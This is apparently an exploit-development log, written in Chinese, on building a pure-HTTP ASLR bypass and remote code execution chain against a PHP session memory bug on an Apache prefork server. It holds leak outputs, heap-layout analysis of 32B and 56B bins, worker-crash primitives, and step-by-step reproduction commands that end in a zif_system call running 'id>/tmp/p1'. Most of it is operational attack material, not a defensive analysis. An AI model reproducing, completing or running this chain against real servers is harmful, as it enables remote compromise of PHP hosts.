# 纯 HTTP ASLR 链：轮换问题研究记录

日期：2026-10-21
参考交付：[ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md)（别人已跑通 5/5，阶段间用
SIGSEGV 轮换 worker）
约束：攻击请求只用 HTTP；**目标 172.16.0.103 上不做任何插桩**（没有 gdb、
没有 /proc 读取、没有目标侧 PHP）。本文的 gdb 测量全部在**我们自己的校准
lab 172.16.1.112** 上完成，不接触目标进程。

状态：**地址泄漏与 RCE 终端本身已是纯 HTTP；剩余唯一工程项是“阶段之间如何
只用一个 HTTP 请求轮换 worker”**。这条还没打通，本文记录阻塞点和下一步。

---

## 1. 已验证（全部在 172.16.0.103，只发 HTTP）

### 1.1 全新 master 的 stage 2 泄漏

```text
$ sudo -n apache2ctl -k stop; sudo -n apache2ctl -k start
$ python3 send_a_leak3.py 1001 5 39 12 17
$ python3 b_target.py 443 16 983

Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00P%3C%E1%01%A6%7F%00%00; path=/
pDestructor = 0x7fa601e13c50
libphp      = 0x7fa601800000   (pDestructor - 0x613c50)
```

`(p & 0x1fffff) == 0x13c50`，libphp 2MB 对齐，泄漏有效。

### 1.2 stage 1 + stage 2 可以在**同一个 worker** 上完成

```text
W0=882266
after A1 W=882266
after B1 W=882266
after A2 W=882266
after B2 W=882266
```

即：

1. `send_a_leak2.py 1001 12` + `b_numleak2.py 892 1 0x1000` → chunk base；
2. 同一 worker 上 `send_a_leak3.py 1001 5 39 12 17` + `b_target.py 443 16 983`
   → libphp base（仍返回 16 字节 `pDestructor`）。

这说明“每个阶段都必须换 fresh worker”并不成立，**两个泄漏可以合并到一次
worker 历史里**，只需要在 stage 3 之前轮换一次。

### 1.3 HTTP 崩溃轮换在**全新 worker**上有效

```text
FRESH W=881054
after A W=881054
CRASHED new=881148 at 17
final W=881148
```

用的就是脚本里的 `rotate()`：

```text
send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
send_b_rce2.py 15 2 0x1 0x1 x
```

`send_b_rce2` 的 fake reference 落在 fresh worker 的 `R0-0x10`，`val.value=1`，
`zend_array_destroy(1)` → SIGSEGV，prefork 立刻 fork 新 worker。

---

## 2. 失败点：HTTP rotate 在**服务过泄漏请求的 worker** 上不工作

### 2.1 官方驱动去掉信号、只用 HTTP rotate 的结果

在 .103 上把 `pure_aslr_run.sh` 的 sudo 改成 `sudo -n`，其余不动：

```text
W1=877061 chunk=0x7f6beba00000 attempt=1
W2=877299 libphp=0x0 attempt=1
W2=877349 libphp=0x0 attempt=2
LIBPHP_LEAK_FAILED
```

阶段 1 成功；HTTP rotate 之后 stage 2 连续两次拿不到 libphp 泄漏
（`b_target.py` 没有返回 16 字节的 `Set-Cookie`）。

### 2.2 直接观察 rotate

阶段 1 之后，连续 6 次 `send_a_pad + send_b_rce2(HT=1)`，worker pid
**一次都没变**：

```text
PHASE1 W=879429
no-rotate try=1 W=879429
...
no-rotate try=6 W=879429
STAGE2 W=879429
SETCOOKIE_LEN 72
VALUE Set-Cookie: PHPSESSID=%10...P%3CaP%EA%7F...
```

这组里 stage 2 反而在同 worker 上成功，说明：

- rotate 的 crash 请求在 used history 上不触发；
- stage 2 不依赖 fresh worker（与 1.2 一致）。

---

## 3. 根因（在 .112 校准 lab 上的 gdb 测量）

> 以下地址都是 no-ASLR lab 的 chunk 相对值；目标是 ASLR，但 chunk 内几何
> 相同。测量不涉及 172.16.0.103。

### 3.1 fresh stage 3 的几何

- A `send_a_pad 17 19 3 12 6×7:7`：
  `PS(http_session_vars).value.ref = chunk + 0x24e0`。
- `R0 - 0x10 = chunk + 0x24d0`，正是 56B bin 的空闲块起点。
- B `send_b_zif 15 2 ...` 的 55B fake-ref raw 正好落在这里；
  fake reference 的字段在 raw+0x10，与 `R0` 对齐。

### 3.2 used history 的几何完全不同

先在同一 worker 上做 stage 1 + stage 2，再发 stage 3 A：

| pads P | R0 | R0 所在页 | 该页在 B `track_init` 时的 map |
|---|---|---|---|
| 6 | chunk+0x1560 | page 1 | `0x80000003` = 32B bin |
| 7 | chunk+0x15c0 | page 1 | `0x80000003` = 32B bin |
| 45 | chunk+0x7d400 | page 125 | `0xc0030018` = NRUN/大块续页 |
| 640 | chunk+0x8b320 | page 139 | `0x0` = FRUN 空闲页 |

而 fresh 的 `R0=chunk+0x24e0` 所在页是 56B bin（56B free head 就是
`chunk+0x24d0`）。

结论：

1. **used history 下 `R0` 落在 32B bin 的页里**，不是 56B 页；
2. `send_b_zif` 的 fake-ref raw 是 55B → 56B bin，**无法分配进 32B 页**；
3. 即使 P 把 `R0` 挪到页对齐的 56B 槽位（例如 P=7 的
   `R0-0x10=chunk+0x15b0`），该页在 B 时仍然是 32B bin（
   `map=0x80000003`），56B raw 还是进不来；
4. P=640 时 `R0` 页甚至是 FRUN（整页空闲），56B bin 的当前 head 仍是
   `chunk+0x24d0`，分配器不会为了几十个 56B 分配去拿那个高地址空闲页。

### 3.3 used history 的 B 可能根本没走到 track_init

对新 worker（fresh）在 `session.c:481`（`php_session_track_init()` 调用点）
下断，A+B 会命中并看到 reference。used history（stage 1+2 后，A P=6）
再下同样的断点、发 B（`b_crash7.py 14`），**一次都没有命中**；
`php_session_rfc1867_cleanup` / `php_session_initialize` 也没有命中。

这说明 used history 下存在两种可能（取决于 P/时序）：

- A 在请求 shutdown 时自己 abort，B 由父进程新 fork 的 worker 处理；
  新 worker 没有悬空 reference，`track_init` 不会再销毁旧的；
- 或 B 的 END cleanup 在 `php_session_initialize()` 里提前返回，
  没走到 `track_init`。

无论哪种，**fresh stage 3 的假 reference 触发点在 used history 上不成立**。
这也是为什么 P=50..75 的同 worker 扫描全部 `nop`。

---

## 4. 纯 HTTP 路径需要什么

要在**不碰目标**的前提下补上最后一块，只有两条路：

### 4.1 可靠的 HTTP worker 轮换（推荐）

把“泄漏”和“利用”分成两个 fresh worker：

```text
W1（fresh）: stage 1 + stage 2 泄漏（已验证可同 worker）
HTTP crash W1 -> W2（fresh，prefork 继承同一 master 的 ASLR）
W2（fresh）: stage 3 exploit（现有 fresh 参数，已验证）
```

缺的只是“W1 是 used，如何用 HTTP 让它崩”。现有 `rotate()` 的
`send_a_pad + send_b_rce2(HT=1)` 只在 fresh worker 有效。

可尝试的纯 HTTP crash 原语：

1. **`b_crash7`（32B 活字符串）**
   - 用 N 个 7 字节 value（zend_string 32B）覆盖 used 的 `R0`；
   - `R0` 是 32B slot，正好匹配 32B value string；
   - `PS(http_session_vars)` 仍被当作 reference：`h=0` 读成
     `val.value`，`len=7` 读成 `IS_ARRAY` → `zend_array_destroy(NULL)`
     崩溃，**不需要 56B 页重分、不受 free-list shadow 影响**。
   - 阻塞：必须让 B 真正走到 `track_init`，且旧 reference 仍在（used
     history 上有时是 UNDEF 或 B 被新 worker 处理）。需要按 used history
     校准 N，并先确认 A 不崩。
2. **让 A 自身在 shutdown 时确定性 abort**
   - used history 的 A 有时会 abort（P=50/68 的 `W3=0`），但不可控；
   - 需要找到一种 A 形状，使 `PS(http_session_vars)` 的 stale 32B 块在
     heap reset 后必然触发 `zend_mm_panic`，并且 A 的响应已发出。
3. **找 malformed multipart / Apache 层的确定性崩溃**
   - 不依赖 PHP 堆布局，纯 HTTP；目前未找到。

### 4.2 不做轮换，直接校准 used-history stage 3

需要同时解决：

1. `R0` 所在页必须是 56B bin（或换用匹配 32B 的 fake-ref 布局）；
2. 56B fake raw 必须落到 `R0-0x10` 这个具体 free slot；
3. A 必须不崩、B 必须走到 `track_init`；
4. `send_b_zif` 的 fake HT carrier 地址（fresh 是 `chunk+0x6e0d8`）
   在 used history 下也要重新校准。

目前 1/3 已有反例（页是 32B、B 不命中），所以这条路成本更高。

---

## 5. 建议的下一步实验

优先做 4.1.1（crash7），因为它只需要 **32B 几何**，与 used `R0` 天然匹配：

1. 在 .112 上固定 used history（stage 1+2 同 worker），A 用 P=6，
   用 `session.c:481` 断点确认 A 之后 `PS(http_session_vars)` 是否仍是
   reference（以及 id/send_cookie 状态）；
2. 如果 A 后 reference 存在，扫 `b_crash7.py N` 的 N，断点看 `R0` 处
   qword：
   - `q0 = 0x0000000600000001`（live string，rc=1/type=6）
   - `q2 = 7`（len=7）
   - `q3 = 0x0076767676767676`（'v'*7）
   即命中；
3. 命中后直接发 `b_crash7.py N`（不带 gdb），确认 worker pid 变化；
4. 到 .103 上只用 HTTP：
   - fresh W1: stage 1 + stage 2 泄漏；
   - `send_a_pad P=6 + b_crash7 N` 轮换；
   - fresh W2: stage 3 `send_a_pad 6 pads + send_b_zif 15 2 HTDATA ZIF`，
     地址来自 W1（prefork 继承同一 master 的 ASLR，chunk/libphp base
     在 worker 重 fork 后保持不变；参考 ASLR_PURE_HTTP.md 第 5 节）。
5. 如果 crash7 的旧 reference 在 used history 上不存在，退而求其次：
   让 stage 2 的 B 在泄漏后自己 abort（改 `b_target` 的目标数组布局，
   使 `zend_string_release_ex(PS(id))` 的 gc/refcount 走 `efree`
   非法内部指针），这样 W1 在 stage 2 之后自然轮换，W2 直接跑 fresh
   stage 3。

---

## 6. 复现命令（.103，纯 HTTP；无 gdb/maps）

```bash
# 1) fresh master
sudo -n apache2ctl -k stop; sudo -n apache2ctl -k start; sleep 0.5

# 2) W1: chunk leak + libphp leak 同 worker
python3 send_a_leak2.py 1001 12; sleep 0.2
python3 b_numleak2.py 892 1 0x1000; sleep 0.2
python3 send_a_leak3.py 1001 5 39 12 17; sleep 0.2
python3 b_target.py 443 16 983
# 解析 /tmp/b_numleak2.resp -> chunk, /tmp/b_target.resp -> pDestructor

# 3) 纯 HTTP 轮换（待校准的 N）
python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
python3 b_crash7.py <N>

# 4) W2: fresh stage 3
HT=$(chunk+0x6e0d8); ZIF=$(libphp+0x43a870)
python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
python3 send_b_zif.py 15 2 $HT $ZIF 'id>/tmp/p1'
```

---

## 7. 文件

| 文件 | 用途 |
|---|---|
| `tools/b_crash7.py` | 32B live-string 崩溃原语（待校准 N） |
| `tools/refq2.gdb` / `flow.gdb` | .112 上用来看 used-history 的 reference/track_init 流程 |
| `tools/pagemap.gdb` | .112 上读 R0 页的 `chunk->map` / free_slot |
| `tools/send_b_probe.py` / `b_probe_long.py` | fake-ref 落点探针 |
| `tools/same_worker_trials.py` | 同 worker stage 3 P 扫描（.112） |
| `tools/pure_aslr_run.sh` | 别人的驱动（含 HTTP rotate，used 上不稳定） |

---

## 8. 结论

- **攻击请求、两条地址泄漏、`zif_system` 终端都已经是纯 HTTP**；
- 录制的 5/5 里阶段间轮换用的是 SIGSEGV；脚本里的 HTTP `rotate()`
  只在 fresh worker 上可靠，在服务过泄漏的 worker 上不触发；
- used history 的根因是 `R0` 落在 32B bin 页，而 fresh stage 3 的
  fake-ref raw 是 56B bin；页未重分，落点几何不成立；
- 最短的补齐路径是：**stage 1+2 同 worker → 用 `b_crash7`（32B）做
  纯 HTTP crash → fresh W2 跑现有 stage 3**。crash7 的 N 需要按
  used history 校准，并且要先确认 A 之后旧 reference 仍在。
